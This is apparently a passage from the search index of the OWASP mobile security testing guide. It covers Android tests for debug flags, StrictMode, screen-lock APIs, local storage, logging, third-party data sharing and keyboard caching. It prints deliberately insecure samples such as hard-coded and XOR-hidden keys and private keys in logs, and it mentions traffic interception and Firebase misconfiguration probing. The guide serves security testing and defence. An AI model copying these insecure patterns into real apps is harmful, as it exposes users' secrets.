AndroidManifest","text":"","tags":["android","R","test","MASWE-0067"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0226/#overview","title":"Overview","text":"<p>This test case checks if the app has the <code>debuggable</code> flag (<code>android:debuggable</code>) set to <code>true</code> in the <code>AndroidManifest.xml</code>. When this flag is enabled, it allows the app to be debugged enabling attackers to inspect the app's internals, bypass security controls, or manipulate runtime behavior.</p> <p>Although having the <code>debuggable</code> flag set to <code>true</code> is not considered a direct vulnerability, it significantly increases the attack surface by providing unauthorized access to app data and resources, particularly in production environments.</p>","tags":["android","R","test","MASWE-0067"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0226/#steps","title":"Steps","text":"<ol> <li>Obtain the <code>AndroidManifest.xml</code> file using  Obtaining Information from the AndroidManifest.</li> <li>Search for the <code>debuggable</code> flag:<ul> <li>Look for <code>android:debuggable</code> if analyzing raw XML using tools like  Apktool.</li> <li>Look for <code>application-debuggable</code> if using  aapt2.</li> </ul> </li> </ol>","tags":["android","R","test","MASWE-0067"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0226/#observation","title":"Observation","text":"<p>The output should explicitly show whether the <code>debuggable</code> flag is set (<code>true</code> or <code>false</code>). If the flag is not specified, it is treated as <code>false</code> by default for release builds.</p>","tags":["android","R","test","MASWE-0067"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0226/#evaluation","title":"Evaluation","text":"<p>The test case fails if the <code>debuggable</code> flag is explicitly set to <code>true</code>. This indicates that the app is configured to allow debugging, which is inappropriate for production environments.</p>","tags":["android","R","test","MASWE-0067"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0226/#mitigations","title":"Mitigations","text":"<ul> <li> Debuggable Flag Disabled in the AndroidManifest</li> </ul>","tags":["android","R","test","MASWE-0067"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0226/#demos","title":"Demos","text":"<p> MASTG-DEMO-0040: Debuggable Flag Enabled in the AndroidManifest with semgrep </p>","tags":["android","R","test","MASWE-0067"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0227/","title":"MASTG-TEST-0227: Debugging Enabled for WebViews","text":"","tags":["android","R","test","MASWE-0067"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0227/#overview","title":"Overview","text":"<p>The <code>WebView.setWebContentsDebuggingEnabled(true)</code> API enables debugging for all WebViews in the application. This feature can be useful during development, but introduces significant security risks if left enabled in production. When enabled, a connected PC can debug, eavesdrop, or modify communication within any WebView in the application. See the \"Android Documentation\" for more details.</p> <p>Note that this flag works independently of the <code>debuggable</code> attribute in the <code>AndroidManifest.xml</code> (see  Debuggable Flag Enabled in the AndroidManifest). Even if the app is not marked as debuggable, the WebViews can still be debugged by calling this API.</p>","tags":["android","R","test","MASWE-0067"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0227/#steps","title":"Steps","text":"<ol> <li>Run  Static Analysis on Android with a tool such as  semgrep on the app binary and look for uses of:<ul> <li><code>WebView.setWebContentsDebuggingEnabled</code> being set to <code>true</code>.</li> <li><code>ApplicationInfo.FLAG_DEBUGGABLE</code>.</li> </ul> </li> </ol>","tags":["android","R","test","MASWE-0067"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0227/#observation","title":"Observation","text":"<p>The output should list:</p> <ul> <li>All locations where <code>WebView.setWebContentsDebuggingEnabled</code> is called with <code>true</code> at runtime.</li> <li>Any references to <code>ApplicationInfo.FLAG_DEBUGGABLE</code>.</li> </ul>","tags":["android","R","test","MASWE-0067"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0227/#evaluation","title":"Evaluation","text":"<p>The test case fails if <code>WebView.setWebContentsDebuggingEnabled(true)</code> is called unconditionally or in contexts where the <code>ApplicationInfo.FLAG_DEBUGGABLE</code> flag is not checked.</p>","tags":["android","R","test","MASWE-0067"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0227/#mitigations","title":"Mitigations","text":"<ul> <li> Debugging Disabled for WebViews</li> </ul>","tags":["android","R","test","MASWE-0067"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0247/","title":"MASTG-TEST-0247: References to APIs for Detecting Secure Screen Lock","text":"","tags":["android","L2","test","MASWE-0008"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0247/#overview","title":"Overview","text":"<p>This test verifies whether an app is running on a device with a passcode set. Android apps can determine whether a secure screen lock (such as PIN, or password) is enabled by using platform-provided APIs. Specifically, apps can utilize the KeyguardManager API, which provides the isDeviceSecure() and isKeyguardSecure() methods to check if the device has a secure lock mechanism in place.</p> <p>Additionally, apps can use the BiometricManager#canAuthenticate(int) API to check whether biometric authentication is available and can be used. Since biometric authentication on Android requires a secure screen lock as a fallback, this method can serve as an alternative check when KeyguardManager is unavailable or restricted by device manufacturers.</p> <p>If an app relies on biometrics for authentication, it should ensure that biometric authentication is enforced using the BiometricPrompt API or by requiring authentication for cryptographic key access via the Android KeyStore System. However, apps cannot force users to enable biometrics at the system level, only enforce its use within the app for accessing sensitive functionality.</p>","tags":["android","L2","test","MASWE-0008"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0247/#steps","title":"Steps","text":"<ol> <li>Use  semgrep to identify the API that checks whether a secure screen lock has been set.</li> </ol>","tags":["android","L2","test","MASWE-0008"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0247/#observation","title":"Observation","text":"<p>The output should contain a list of locations where relevant APIs are used.</p>","tags":["android","L2","test","MASWE-0008"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0247/#evaluation","title":"Evaluation","text":"<p>The test fails if an app doesn't use any API to verify the secure screen lock presence.</p>","tags":["android","L2","test","MASWE-0008"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0247/#demos","title":"Demos","text":"<p> MASTG-DEMO-0028: Uses of KeyguardManager.isDeviceSecure and BiometricManager.canAuthenticate with semgrep </p>","tags":["android","L2","test","MASWE-0008"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0249/","title":"MASTG-TEST-0249: Runtime Use of Secure Screen Lock Detection APIs","text":"","tags":["android","L2","test","MASWE-0008"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0249/#overview","title":"Overview","text":"<p>This test is the dynamic counterpart to  References to APIs for Detecting Secure Screen Lock.</p>","tags":["android","L2","test","MASWE-0008"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0249/#steps","title":"Steps","text":"<ol> <li>Run a dynamic analysis tool like  Frida for iOS and look for uses of <code>KeyguardManager.isDeviceSecure</code> and <code>BiometricManager.canAuthenticate</code> APIs.</li> </ol>","tags":["android","L2","test","MASWE-0008"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0249/#observation","title":"Observation","text":"<p>The output should contain a list of locations where relevant APIs are used.</p>","tags":["android","L2","test","MASWE-0008"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0249/#evaluation","title":"Evaluation","text":"<p>The test fails if an app doesn't use any API to verify the secure screen lock presence.</p>","tags":["android","L2","test","MASWE-0008"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0249/#demos","title":"Demos","text":"<p> MASTG-DEMO-0027: Runtime Use of KeyguardManager.isDeviceSecure and BiometricManager.canAuthenticate APIs with Frida </p>","tags":["android","L2","test","MASWE-0008"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0263/","title":"MASTG-TEST-0263: Logging of StrictMode Violations","text":"","tags":["android","R","test","MASWE-0094"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0263/#overview","title":"Overview","text":"<p>This test checks whether an app enables <code>StrictMode</code> in production. While useful for developers to log policy violations such as disk I/O or network operations in production apps, leaving <code>StrictMode</code> enabled can expose sensitive implementation details in the logs that could be exploited by attackers.</p>","tags":["android","R","test","MASWE-0094"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0263/#steps","title":"Steps","text":"<ol> <li>Install the production build of your app on your device or emulator.</li> <li>Uses  Monitoring System Logs to show the system logs <code>StrictMode</code> creates.</li> <li>Open the app and let it execute.</li> </ol>","tags":["android","R","test","MASWE-0094"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0263/#observation","title":"Observation","text":"<p>The output should contain a list of log statements related to <code>StrictMode</code>.</p>","tags":["android","R","test","MASWE-0094"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0263/#evaluation","title":"Evaluation","text":"<p>The test fails if an app logs any <code>StrictMode</code> policy violations.</p>","tags":["android","R","test","MASWE-0094"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0263/#demos","title":"Demos","text":"<p> MASTG-DEMO-0037: App Leaking Information about Unclosed SQL Cursor via StrictMode </p>","tags":["android","R","test","MASWE-0094"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0264/","title":"MASTG-TEST-0264: Runtime Use of StrictMode APIs","text":"","tags":["android","R","test","MASWE-0094"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0264/#overview","title":"Overview","text":"<p>This test checks whether the app uses <code>StrictMode</code> by dynamically analyzing the app's behavior and placing relevant hooks to detect the use of <code>StrictMode</code> APIs, such as <code>StrictMode.setVmPolicy</code> and <code>StrictMode.VmPolicy.Builder.penaltyLog</code>.</p> <p>While <code>StrictMode</code> is useful for developers to log policy violations such as disk I/O or network operations during development, it can expose sensitive implementation details in the logs that could be exploited by attackers.</p>","tags":["android","R","test","MASWE-0094"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0264/#steps","title":"Steps","text":"<ol> <li>Use runtime method hooking (see  Method Hooking) and look for uses of <code>StrictMode</code> APIs.</li> </ol>","tags":["android","R","test","MASWE-0094"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0264/#observation","title":"Observation","text":"<p>The output should show the runtime usage of <code>StrictMode</code> APIs.</p>","tags":["android","R","test","MASWE-0094"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0264/#evaluation","title":"Evaluation","text":"<p>The test fails if the Frida script output shows the runtime usage of <code>StrictMode</code> APIs.</p>","tags":["android","R","test","MASWE-0094"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0264/#demos","title":"Demos","text":"<p> MASTG-DEMO-0038: Detecting StrictMode Uses with Frida </p>","tags":["android","R","test","MASWE-0094"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0265/","title":"MASTG-TEST-0265: References to StrictMode APIs","text":"","tags":["android","R","test","MASWE-0094"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0265/#overview","title":"Overview","text":"<p>This test checks whether the app uses <code>StrictMode</code>. While useful for developers to log policy violations such as disk I/O or network operations during development, it can expose sensitive implementation details in the logs that could be exploited by attackers.</p>","tags":["android","R","test","MASWE-0094"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0265/#steps","title":"Steps","text":"<ol> <li>Run a static analysis ( Static Analysis on Android) tool to identify all instances of <code>StrictMode</code> APIs.</li> </ol>","tags":["android","R","test","MASWE-0094"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0265/#observation","title":"Observation","text":"<p>The output should identify all instances of <code>StrictMode</code> usage in the app.</p>","tags":["android","R","test","MASWE-0094"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0265/#evaluation","title":"Evaluation","text":"<p>The test fails if the app uses <code>StrictMode</code> APIs.</p>","tags":["android","R","test","MASWE-0094"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0265/#demos","title":"Demos","text":"<p> MASTG-DEMO-0039: Detecting StrictMode PenaltyLog Usage with Semgrep </p>","tags":["android","R","test","MASWE-0094"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0001/","title":"MASTG-TEST-0001: Testing Local Storage for Sensitive Data","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Data Stored in the App Sandbox at Runtime</li> <li> Files Written to External Storage</li> <li> Runtime Use of APIs to Access External Storage</li> <li> References to APIs and Permissions for Accessing External Storage</li> </ul>","tags":["android","L1","L2","test","MSTG-STORAGE-1","MSTG-STORAGE-2","masvs-storage-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0001/#overview","title":"Overview","text":"<p>This test case focuses on identifying potentially sensitive data stored by an application and verifying if it is securely stored. The following checks should be performed:</p> <ul> <li>Analyze data storage in the source code.</li> <li>Be sure to trigger all possible functionality in the application (e.g. by clicking everywhere possible) in order to ensure data generation.</li> <li>Check all application generated and modified files and ensure that the storage method is sufficiently secure.<ul> <li>This includes <code>SharedPreferences</code>, databases, Internal Storage, External Storage, etc.</li> </ul> </li> </ul> <p>NOTE: For MASVS L1 compliance, it is sufficient to store data unencrypted in the application's internal storage directory (sandbox). For L2 compliance, additional encryption is required using cryptographic keys securely managed in the Android KeyStore. This includes using envelope encryption (DEK+KEK) or equivalent methods, or using the Android Security Library's <code>EncryptedFile</code>/<code>EncryptedSharedPreferences</code>.</p> <p>Warning</p> <p>The Jetpack security crypto library, including the <code>EncryptedFile</code> and  <code>EncryptedSharedPreferences</code> classes, has been deprecated. However, since an official replacement has not yet been released, we recommend using these classes until one is available.</p>","tags":["android","L1","L2","test","MSTG-STORAGE-1","MSTG-STORAGE-2","masvs-storage-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0001/#static-analysis","title":"Static Analysis","text":"<p>First of all, try to determine the kind of storage used by the Android app and to find out whether the app processes sensitive data insecurely.</p> <ul> <li>Check <code>AndroidManifest.xml</code> for read/write external storage permissions, for example, <code>uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"</code>.</li> <li>Check the source code for keywords and API calls that are used to store data:<ul> <li>File permissions, such as:<ul> <li><code>MODE_WORLD_READABLE</code> or <code>MODE_WORLD_WRITABLE</code>: You should avoid using <code>MODE_WORLD_WRITEABLE</code> and <code>MODE_WORLD_READABLE</code> for files because any app will be able to read from or write to the files, even if they are stored in the app's private data directory. If data must be shared with other applications, consider a content provider. A content provider offers read and write permissions to other apps and can grant dynamic permission on a case-by-case basis.</li> </ul> </li> <li>Classes and functions, such as:<ul> <li>the <code>SharedPreferences</code> class ( stores key-value pairs)</li> <li>the <code>FileOutPutStream</code> class (uses internal or external storage)</li> <li>the <code>getExternal*</code> functions (use external storage)</li> <li>the <code>getWritableDatabase</code> function (returns a SQLiteDatabase for writing)</li> <li>the <code>getReadableDatabase</code> function (returns a SQLiteDatabase for reading)</li> <li>the <code>getCacheDir</code> and <code>getExternalCacheDirs</code> function (use cached files)</li> </ul> </li> </ul> </li> </ul> <p>Encryption should be implemented using proven SDK functions. The following describes bad practices to look for in the source code:</p> <ul> <li>Locally stored sensitive information \"encrypted\" via simple bit operations like XOR or bit flipping. These operations should be avoided because the encrypted data can be recovered easily.</li> <li>Keys used or created without Android onboard features, such as the Android KeyStore</li> <li>Keys disclosed by hard-coding</li> </ul> <p>A typical misuse are hard-coded cryptographic keys. Hard-coded and world-readable cryptographic keys significantly increase the possibility that encrypted data will be recovered. Once an attacker obtains the data, decrypting it is trivial. Symmetric cryptography keys must be stored on the device, so identifying them is just a matter of time and effort. Consider the following code:</p> <pre><code>this.db = localUserSecretStore.getWritableDatabase(\"SuperPassword123\");\n</code></pre> <p>Obtaining the key is trivial because it is contained in the source code and identical for all installations of the app. Encrypting data this way is not beneficial. Look for hard-coded API keys/private keys and other valuable data; they pose a similar risk. Encoded/encrypted keys represent another attempt to make it harder but not impossible to get the crown jewels.</p> <p>Consider the following code:</p> <p>Example in Java:</p> <pre><code>//A more complicated effort to store the XOR'ed halves of a key (instead of the key itself)\nprivate static final String[] myCompositeKey = new String[]{\n  \"oNQavjbaNNSgEqoCkT9Em4imeQQ=\",\"3o8eFOX4ri/F8fgHgiy/BS47\"\n};\n</code></pre> <p>Example in Kotlin:</p> <pre><code>private val myCompositeKey = arrayOf&lt;String&gt;(\"oNQavjbaNNSgEqoCkT9Em4imeQQ=\", \"3o8eFOX4ri/F8fgHgiy/BS47\")\n</code></pre> <p>The algorithm for decoding the original key might be something like this:</p> <p>Example in Java:</p> <pre><code>public void useXorStringHiding(String myHiddenMessage) {\n  byte[] xorParts0 = Base64.decode(myCompositeKey[0],0);\n  byte[] xorParts1 = Base64.decode(myCompositeKey[1],0);\n\n  byte[] xorKey = new byte[xorParts0.length];\n  for(int i = 0; i &lt; xorParts1.length; i++){\n    xorKey[i] = (byte) (xorParts0[i] ^ xorParts1[i]);\n  }\n  HidingUtil.doHiding(myHiddenMessage.getBytes(), xorKey, false);\n}\n</code></pre> <p>Example in Kotlin:</p> <pre><code>fun useXorStringHiding(myHiddenMessage:String) {\n  val xorParts0 = Base64.decode(myCompositeKey[0], 0)\n  val xorParts1 = Base64.decode(myCompositeKey[1], 0)\n  val xorKey = ByteArray(xorParts0.size)\n  for (i in xorParts1.indices)\n  {\n    xorKey[i] = (xorParts0[i] xor xorParts1[i]).toByte()\n  }\n  HidingUtil.doHiding(myHiddenMessage.toByteArray(), xorKey, false)\n}\n</code></pre> <p>Verify common locations of secrets:</p> <ul> <li>resources (typically at res/values/strings.xml)   Example:</li> </ul> <pre><code>&lt;resources&gt;\n    &lt;string name=\"app_name\"&gt;SuperApp&lt;/string&gt;\n    &lt;string name=\"hello_world\"&gt;Hello world!&lt;/string&gt;\n    &lt;string name=\"action_settings\"&gt;Settings&lt;/string&gt;\n    &lt;string name=\"secret_key\"&gt;My_Secret_Key&lt;/string&gt;\n  &lt;/resources&gt;\n</code></pre> <ul> <li>build configs, such as in local.properties or gradle.properties   Example:</li> </ul> <pre><code>buildTypes {\n  debug {\n    minifyEnabled true\n    buildConfigField \"String\", \"hiddenPassword\", \"\\\"${hiddenPassword}\\\"\"\n  }\n}\n</code></pre>","tags":["android","L1","L2","test","MSTG-STORAGE-1","MSTG-STORAGE-2","masvs-storage-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0001/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Install and use the app, executing all functions at least once. Data can be generated when entered by the user, sent by the endpoint, or shipped with the app. Then complete the following:</p> <ul> <li>Check both internal and external local storage for any files created by the application that contain sensitive data.</li> <li>Identify development files, backup files, and old files that shouldn't be included with a production release.</li> <li>Determine whether SQLite databases are available and whether they contain sensitive information. SQLite databases are stored in <code>/data/data/&lt;package-name&gt;/databases</code>.</li> <li>Identify if SQLite databases are encrypted. If so, determine how the database password is generated and stored and if this is sufficiently protected as described in the \"Storing a Key\" section of the Keystore overview.</li> <li>Check Shared Preferences that are stored as XML files (in <code>/data/data/&lt;package-name&gt;/shared_prefs</code>) for sensitive information. Shared Preferences are insecure and unencrypted by default. Some apps might opt to use secure-preferences to encrypt the values stored in Shared Preferences.</li> <li>Check the permissions of the files in <code>/data/data/&lt;package-name&gt;</code>. Only the user and group created when you installed the app (e.g., u0_a82) should have user read, write, and execute permissions (<code>rwx</code>). Other users should not have permission to access files, but they may have execute permissions for directories.</li> <li>Check for the usage of any Firebase Real-time databases and attempt to identify if they are misconfigured by making the following network call:<ul> <li><code>https://_firebaseProjectName_.firebaseio.com/.json</code></li> </ul> </li> <li>Determine whether a Realm database is available in <code>/data/data/&lt;package-name&gt;/files/</code>, whether it is unencrypted, and whether it contains sensitive information. By default, the file extension is <code>realm</code> and the file name is <code>default</code>. Inspect the Realm database with the Realm Browser.</li> </ul>","tags":["android","L1","L2","test","MSTG-STORAGE-1","MSTG-STORAGE-2","masvs-storage-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0003/","title":"MASTG-TEST-0003: Testing Logs for Sensitive Data","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Runtime Use of Logging APIs</li> <li> References to Logging APIs</li> </ul>","tags":["android","L1","L2","test","MSTG-STORAGE-3","masvs-storage-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0003/#overview","title":"Overview","text":"<p>This test case focuses on identifying any sensitive application data within both system and application logs. The following checks should be performed:</p> <ul> <li>Analyze source code for logging related code.</li> <li>Check application data directory for log files.</li> <li>Gather system messages and logs and analyze for any sensitive data.</li> </ul> <p>As a general recommendation to avoid potential sensitive application data leakage, logging statements should be removed from production releases unless deemed necessary to the application or explicitly identified as safe, e.g. as a result of a security audit.</p>","tags":["android","L1","L2","test","MSTG-STORAGE-3","masvs-storage-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0003/#static-analysis","title":"Static Analysis","text":"<p>Applications will often use the Log Class and Logger Class to create logs. To discover this, you should audit the application's source code for any such logging classes. These can often be found by searching for the following keywords:</p> <ul> <li> <p>Functions and classes, such as:</p> <ul> <li><code>android.util.Log</code></li> <li><code>Log.d</code> | <code>Log.e</code> | <code>Log.i</code> | <code>Log.v</code> | <code>Log.w</code> | <code>Log.wtf</code></li> <li><code>Logger</code></li> </ul> </li> <li> <p>Keywords and system output:</p> <ul> <li><code>System.out.print</code> | <code>System.err.print</code></li> <li>logfile</li> <li>logging</li> <li>logs</li> </ul> </li> </ul> <p>While preparing the production release, you can use tools like  Proguard (included in Android Studio). To determine whether all logging functions from the <code>android.util.Log</code> class have been removed, check the ProGuard configuration file (proguard-rules.pro) for the following options (according to this example of removing logging code and this article about enabling ProGuard in an Android Studio project):</p> <pre><code>-assumenosideeffects class android.util.Log\n{\n  public static boolean isLoggable(java.lang.String, int);\n  public static int v(...);\n  public static int i(...);\n  public static int w(...);\n  public static int d(...);\n  public static int e(...);\n  public static int wtf(...);\n}\n</code></pre> <p>Note that the example above only ensures that calls to the Log class' methods will be removed. If the string that will be logged is dynamically constructed, the code that constructs the string may remain in the bytecode. For example, the following code issues an implicit <code>StringBuilder</code> to construct the log statement:</p> <p>Example in Java:</p> <pre><code>Log.v(\"Private key tag\", \"Private key [byte format]: \" + key);\n</code></pre> <p>Example in Kotlin:</p> <pre><code>Log.v(\"Private key tag\", \"Private key [byte format]: $key\")\n</code></pre> <p>The compiled bytecode, however, is equivalent to the bytecode of the following log statement, which constructs the string explicitly:</p> <p>Example in Java:</p> <pre><code>Log.v(\"Private key tag\", new StringBuilder(\"Private key [byte format]: \").append(key.toString()).toString());\n</code></pre> <p>Example in Kotlin:</p> <pre><code>Log.v(\"Private key tag\", StringBuilder(\"Private key [byte format]: \").append(key).toString())\n</code></pre> <p>ProGuard guarantees removal of the <code>Log.v</code> method call. Whether the rest of the code (<code>new StringBuilder ...</code>) will be removed depends on the complexity of the code and the ProGuard version.</p> <p>This is a security risk because the (unused) string leaks plain text data into memory, which can be accessed via a debugger or memory dumping.</p> <p>Unfortunately, no silver bullet exists for this issue, but one option would be to implement a custom logging facility that takes simple arguments and constructs the log statements internally.</p> <pre><code>SecureLog.v(\"Private key [byte format]: \", key);\n</code></pre> <p>Then configure ProGuard to strip its calls.</p>","tags":["android","L1","L2","test","MSTG-STORAGE-3","masvs-storage-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0003/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Use all the mobile app functions at least once, then identify the application's data directory and look for log files (<code>/data/data/&lt;package-name&gt;</code>). Check the application logs to determine whether log data has been generated; some mobile applications create and store their own logs in the data directory.</p> <p>Many application developers still use <code>System.out.println</code> or <code>printStackTrace</code> instead of a proper logging class. Therefore, your testing strategy must include all output generated while the application is starting, running and closing. To determine what data is directly printed by <code>System.out.println</code> or <code>printStackTrace</code>, you can use <code>Logcat</code> as explained in the chapter \"Basic Security Testing\", section \"Monitoring System Logs\".</p> <p>Remember that you can target a specific app by filtering the Logcat output as follows:</p> <pre><code>adb logcat | grep \"$(adb shell ps | grep &lt;package-name&gt; | awk '{print $2}')\"\n</code></pre> <p>If you already know the app PID you may give it directly using <code>--pid</code> flag.</p> <p>You may also want to apply further filters or regular expressions (using <code>logcat</code>'s regex flags <code>-e &lt;expr&gt;, --regex=&lt;expr&gt;</code> for example) if you expect certain strings or patterns to come up in the logs.</p>","tags":["android","L1","L2","test","MSTG-STORAGE-3","masvs-storage-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0004/","title":"MASTG-TEST-0004: Determining Whether Sensitive Data Is Shared with Third Parties via Embedded Services","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0004: Determining Whether Sensitive Data Is Shared with Third Parties via Embedded Services (android)</p> <p> Send Feedback</p>","tags":["android","L1","L2","test","MSTG-STORAGE-4","masvs-storage-2"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0004/#overview","title":"Overview","text":"","tags":["android","L1","L2","test","MSTG-STORAGE-4","masvs-storage-2"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0004/#static-analysis","title":"Static Analysis","text":"<p>To determine whether API calls and functions provided by the third-party library are used according to best practices, review their source code, requested permissions and check for any known vulnerabilities.</p> <p>All data that's sent to third-party services should be anonymized to prevent exposure of PII (Personal Identifiable Information) that would allow the third party to identify the user account. No other data (such as IDs that can be mapped to a user account or session) should be sent to a third party.</p>","tags":["android","L1","L2","test","MSTG-STORAGE-4","masvs-storage-2"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0004/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Check all requests to external services for embedded sensitive information. To intercept traffic between the client and server, you can perform dynamic analysis by launching a Machine-in-the-Middle (MITM) attack with  Burp Suite or  ZAP. Once you route the traffic through the interception proxy, you can try to sniff the traffic that passes between the app and server. All app requests that aren't sent directly to the server on which the main function is hosted should be checked for sensitive information, such as PII in a tracker or ad service.</p>","tags":["android","L1","L2","test","MSTG-STORAGE-4","masvs-storage-2"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0005/","title":"MASTG-TEST-0005: Determining Whether Sensitive Data Is Shared with Third Parties via Notifications","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0005: Determining Whether Sensitive Data Is Shared with Third Parties via Notifications (android)</p> <p> Send Feedback</p>","tags":["android","L1","L2","test","MSTG-STORAGE-4","masvs-storage-2"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0005/#overview","title":"Overview","text":"","tags":["android","L1","L2","test","MSTG-STORAGE-4","masvs-storage-2"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0005/#static-analysis","title":"Static Analysis","text":"<p>Search for any usage of the <code>NotificationManager</code> class which might be an indication of some form of notification management. If the class is being used, the next step would be to understand how the application is generating the notifications and which data ends up being shown.</p>","tags":["android","L1","L2","test","MSTG-STORAGE-4","masvs-storage-2"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0005/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Run the application and start tracing all calls to functions related to the notifications creation, e.g. <code>setContentTitle</code> or <code>setContentText</code> from <code>NotificationCompat.Builder</code>. Observe the trace in the end and evaluate if it contains any sensitive information which another app might have eavesdropped.</p>","tags":["android","L1","L2","test","MSTG-STORAGE-4","masvs-storage-2"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0006/","title":"MASTG-TEST-0006: Determining Whether the Keyboard Cache Is Disabled for Text Input Fields","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> References to Keyboard Caching Attributes in UI Elements</li> </ul>","tags":["android","L1","L2","test","MSTG-STORAGE-5","masvs-storage-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0006/#overview","title":"Overview","text":"","tags":["android","L1","L2","test","MSTG-STORAGE-5","masvs-storage-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0006/#static-analysis","title":"Static Analysis","text":"<p>In the layout definition of an activity, you can define <code>TextViews</code> that have XML attributes. If the XML attribute <code>android:inputType</code> is given the value <code>textNoSuggestions</code>, the keyboard cache will not be shown when the input field is selected. The user will have to type everything manually.</p> <pre><code>   &lt;EditText\n        android:id=\"@+id/KeyBoardCache\"\n        android:inputType=\"textNoSuggestions\" /&gt;\n</code></pre> <p>The code for all input fields that take sensitive information should include this XML attribute to disable the keyboard suggestions.</p> <p>Alternatively, the developer can use the following constants:</p> XML <code>android:inputType</code> Code <code>InputType</code> API level <code>textPassword</code> <code>TYPE_TEXT_VARIATION_PASSWORD</code> 3 <code>textVisiblePassword</code> <code>TYPE_TEXT_VARIATION_VISIBLE_PASSWORD</code> 3 